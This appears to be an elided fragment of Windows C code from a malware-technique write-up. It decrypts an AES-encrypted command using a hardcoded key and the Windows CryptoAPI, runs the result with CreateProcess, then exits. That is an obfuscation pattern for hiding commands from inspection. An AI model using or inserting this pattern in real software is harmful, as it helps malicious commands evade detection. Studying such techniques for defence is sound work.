...
int AESDecrypt(char * data, unsigned int data_len, char * key, size_t keylen) {
  ...
  if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE*)data, &d_len)){
    return -1;
  }
...
{
  // decrypt command
  AESDecrypt((char *) myCmd, myCmdL, (char*)mySecretKey, sizeof(mySecretKey));
  ...
  CreateProcess(NULL, (LPSTR)command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
  exit(0);
}
